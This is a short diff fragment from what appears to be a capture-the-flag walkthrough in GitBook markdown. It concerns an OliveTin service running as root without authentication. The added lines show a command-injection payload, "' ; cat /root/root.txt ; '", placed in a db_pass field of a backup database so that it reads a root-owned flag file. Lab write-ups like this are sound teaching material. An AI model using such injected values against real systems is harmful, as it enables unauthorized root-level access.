@@ -253,3 +253,10 @@ This is **gold**. OliveTin runs as **root**, has **no authentication required, i
 
 <figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
+{% code overflow="wrap" %}
+```bash
+in the backup database 
+on db_pass : ' ; cat /root/root.txt ; '
+```
+{% endcode %}
+
